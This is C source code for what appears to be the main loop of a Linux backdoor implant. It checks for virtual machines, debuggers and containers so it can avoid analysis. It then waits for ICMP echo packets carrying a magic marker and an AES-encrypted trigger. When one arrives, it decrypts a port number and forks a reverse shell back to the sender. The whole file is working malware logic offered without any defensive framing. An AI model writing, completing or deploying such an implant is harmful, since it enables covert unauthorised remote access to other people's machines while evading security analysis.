#include "config.h"
#include "crypto.h"
#include "shell.h"
#include "evasion.h"

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/wait.h>

int main(void) {
    int (*checks[])() = {
        check_sys_vendor,
        check_product_name,
        check_debugger_self_status,
        check_if_in_container
    };

    int num_checks = sizeof(checks) / sizeof(checks[0]);
    for (int i = 0; i < num_checks; i++) {
        if (checks[i]()) return 0;
    }

    int my_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (my_socket < 0) {
        return 1;
    }

    char *buf = malloc(BUF_SIZE);
    if (!buf) {
        return 1;
    }

    struct sockaddr_in sender;
    socklen_t sender_len = sizeof(sender);

    while (1) {
        memset(buf, 0, BUF_SIZE);

        int n = recvfrom(my_socket, buf, BUF_SIZE, 0,
                (struct sockaddr*)&sender, &sender_len);

        if (n <= 0) continue;

        // skip IP header (20 bytes) + ICMP header (8 bytes)
        uint8_t *payload    = (uint8_t*)buf + 20 + 8;
        int      payload_len = n - 20 - 8;

        // filtering. get only ICMP echo
        struct icmphdr *icmp = (struct icmphdr*)(buf + 20);
        if (icmp->type != ICMP_ECHO) continue;

        if (payload_len != PAYLOAD_SIZE) {
            continue;
        }

        if (memcmp(payload, MAGIC, 4) != 0) {
            continue;
        }

        uint8_t *nonce      = payload + 4;
        uint8_t *ciphertext = payload + 4 + NONCE_LEN;
        uint8_t *tag        = ciphertext + CT_LEN;

        uint8_t plaintext[64] = {0};
        uint8_t aes_key[32] = {0};
        reconstruct_key(aes_key);
        int ok = decrypt_payload(nonce, aes_key, ciphertext, tag, plaintext);

        if (ok == 1) {
            uint16_t port = (plaintext[11] << 8) | plaintext[12];

            // fork and then revshell; so that the main implant can still live.
            pid_t pid = fork();
            if (pid == 0) {
                reverse_shell(inet_ntoa(sender.sin_addr), port);
            }
        }
    }

    free(buf);
    close(my_socket);
    return 0;
}
